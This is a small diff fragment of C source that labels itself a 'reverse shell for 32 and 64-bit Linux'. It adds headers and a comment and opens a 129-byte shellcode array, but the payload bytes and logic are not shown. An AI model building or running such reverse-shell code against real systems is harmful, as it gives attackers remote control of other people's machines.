@@ -31,12 +31,15 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdint.h>
+#include <stdlib.h>
 
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <sys/mman.h>
 
+// reverse shell for 32 and 64-bit Linux
+//
 #define RS_SIZE 129
 
 char RS[] = {
